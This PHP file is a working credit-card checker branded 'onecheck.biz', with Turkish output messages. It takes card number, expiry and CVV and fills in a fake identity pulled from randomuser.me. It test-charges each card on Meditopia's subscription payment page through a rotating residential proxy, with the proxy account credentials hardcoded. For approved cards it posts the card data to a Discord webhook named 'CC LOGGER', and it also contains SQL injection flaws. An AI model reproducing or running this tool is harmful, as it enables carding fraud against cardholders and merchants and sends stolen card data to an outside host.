<?php

include'core/config.php';
$username  = $_SESSION["username"];
$kbilgi= $vt->query("select * from users where username='$username'")->fetch();
$bakim= $vt->query("select * from genel where name='bakim'")->fetch();

if(!isset($_SESSION["username"])){
    echo "YETKİSİZ İŞLEM İP ADRESİ LOGLANDI";
}elseif ($kbilgi["status"] <= 0) {
    echo "YETKİSİZ İŞLEM İP ADRESİ LOGLANDI";
}elseif ($bakim["value"] >= 1) {
    echo "web sitemiz şuan bakımdadır";
}elseif (!isset($_GET["lista"])){
    echo "YETKİSİZ İŞLEM İP ADRESİ LOGLANDI";
}
else{



$islem= $vt->query("select * from genel where name='islem'")->fetch();


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Europe/Istanbul');

extract($_GET);
$lista= str_replace(array(":", ";", ",", "|", "�", "/", "\\", " "), "|", $lista);
$lista= str_replace(array("||", "|||"), "|", $lista);
$lista= str_replace(array("||", "|||"), "|", $lista);
$lista= str_replace(array("||", "|||"), "|", $lista);
$lista= str_replace(array("||", "|||"), "|", $lista);
$lista= str_replace(array("|19|"), "|2019|", $lista);
$lista= str_replace(array("|20|"), "|2020|", $lista);
$lista= str_replace(array("|21|"), "|2021|", $lista);
$lista= str_replace(array("|22|"), "|2022|", $lista);
$lista= str_replace(array("|23|"), "|2023|", $lista);
$lista= str_replace(array("|24|"), "|2024|", $lista);
$lista= str_replace(array("|25|"), "|2025|", $lista);
$lista= str_replace(array("|26|"), "|2026|", $lista);
$lista= str_replace(array("|27|"), "|2027|", $lista);	
$lista= str_replace(array("|28|"), "|2028|", $lista);
$lista= str_replace(array("|29|"), "|2029|", $lista);
$lista= str_replace(array("|01|"), "|1|", $lista);
$lista= str_replace(array("|02|"), "|2|", $lista);
$lista= str_replace(array("|03|"), "|3|", $lista);
$lista= str_replace(array("|04|"), "|4|", $lista);
$lista= str_replace(array("|05|"), "|5|", $lista);
$lista= str_replace(array("|06|"), "|6|", $lista);
$lista= str_replace(array("|07|"), "|7|", $lista);
$lista= str_replace(array("|08|"), "|8|", $lista);
$lista= str_replace(array("|09|"), "|9|", $lista);
$separa = explode("|", $lista);
$cc = trim($separa[0]);
$mes = trim($separa[1]);
$ano = trim($separa[2]);
$cvv = trim($separa[3]);




$time = date('d.m.Y h:i');

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();


$get = file_get_contents('https://randomuser.me/api/1.2/?nat=tr');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


$username = 'lum-customer-hl_33b70d76-zone-meditopia_com';
$password = 'rqhjuuexjfhh';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://offers.meditopia.com/subscribe/pay?lang=tr&code=&affcode=web');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://offers.meditopia.com',
    'referer: https://offers.meditopia.com/subscribe/?lang=tr&affcode=web&code=&d=1',
    'sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ad=1MonthFree&cardHolderName=Ayaz+yildiz&cardNumber='.$cc.'&cardExpirationMonth='.$mes.'&cardExpirationYear='.$ano.'&cardCVV='.$cvv.'');
$result = curl_exec($ch);
curl_close($ch);
$islem = $islem["value"] + 1 ;
$islem = "UPDATE genel SET value='$islem' where name='islem'";
                if ($vt->query($islem)===true) {
                }


$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$type = $fim['type'];
$brand = $fim['brand'];
$scheme = $fim['scheme'];

if(strpos($fim, '"type":"credit"') !== false) {
	$type = 'Credit';
} else {
	$type = 'Debit';
}


if(strpos($result, '"status":0')) {
    echo '<h7> #Red | Reddedildi - '.$lista.' - '.$bank.', '.$scheme.', '.$brand.', '.$country.' - '.$time.' - www.onecheck.biz </br> </h7> ';

}elseif(strpos($result, '"status":1')){
    
    echo '<h7> #Onaylandı | Ödeme başarılı - '.$lista.' - '.$bank.', '.$scheme.', '.$brand.', '.$country.' - '.$time.' - www.onecheck.biz </br> </h7> ';
    $webhookurl = "https://discord.com/api/webhooks/813858111831146548/AkKNJ284l4VeKs0XMh4-gkqifz5vtxZys-G6clE2egTqx_VTnm9AolyBq87CwMSFW-xl";

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([

    "username" => "CC LOGGER",

    "avatar_url" => "https://cdn.discordapp.com/attachments/798621683468599296/809547689141862480/logo.png",

    "tts" => false,

    // "file" => "",
    "embeds" => [
        [
            "type" => "rich",

            "description" => "Ödeme Onaylandı Kart Numarası `$lista`",

            "timestamp" => $timestamp,

            "color" => hexdec( "060818" ),

            "author" => [
                "name" => "Ödeme Onaylandı",
                
            ],

            "fields" => [
                [
                    "name" => "Checklenen Pos",
                    "value" => "Türkiye Pos",
                    "inline" => false
                ],
              
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );

curl_close( $ch );
    
}else{
    
    echo '<h7> #Hata | Hata oluştu tekrar checkleyin - '.$lista.' - '.$bank.', '.$scheme.', '.$brand.', '.$country.' - '.$time.' - www.onecheck.biz </br> </h7> ';
    

}


  ob_flush();
  echo $result;

}
?>
